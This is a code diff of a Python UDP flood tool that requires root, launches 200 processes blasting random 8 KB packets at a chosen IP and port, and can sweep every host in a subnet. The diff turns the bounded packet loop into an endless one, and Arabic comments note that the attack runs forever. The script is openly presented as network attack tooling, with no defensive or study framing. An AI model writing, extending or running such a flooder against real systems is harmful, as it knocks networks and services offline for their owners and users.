@@ -1,15 +1,12 @@
 import socket
 import random
 import multiprocessing
-import time
 import ipaddress
 import os
 import sys
 
 
 os.system('clear')  
-
-
 
 if os.geteuid() != 0:
     print("\033[1;31mRun the program with root privileges!\033[0m")
@@ -34,35 +31,32 @@ print("-You can attack the network🚀 ")
 print("""
 """ )
 
-
-def udp_flood(target_ip, target_port, count, packets_per_process=1000):
+def udp_flood(target_ip, target_port):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(8192)  
-    while count < packets_per_process:
+    count = 0
+    while True:  # يستمر الهجوم إلى الأبد
         client.sendto(data, (target_ip, target_port))  
         count += 1
         if count % 100 == 0:  
             print(f"Sent {count} packets to {target_ip}:{target_port}")
 
-
 def start_attack(target_ip, target_port):
     processes = []
-    for i in range(200):  
-        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, i + 1))
+    for i in range(200):  # عدد العمليات التي سيتم تنفيذها
+        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port))
         process.daemon = True
         processes.append(process)
         process.start()
 
     for process in processes:
-        process.join()
-
+        process.join()  # سيستمر الهجوم بلا توقف
 
 def attack_network(network_ip, target_port):
     net = ipaddress.IPv4Network(network_ip, strict=False)
     for ip in net.hosts():  
         print(f"Attacking {ip}...")
         start_attack(str(ip), target_port)
-
 
 def is_valid_ip(ip):
     try:
@@ -71,10 +65,8 @@ def is_valid_ip(ip):
     except socket.error:
         return False
 
-
 def contains_three_dots(ip):
     return ip.count('.') == 3
-
 
 if __name__ == "__main__":
     print("\033[1;34mChoose the type of attack:\033[0m\n")
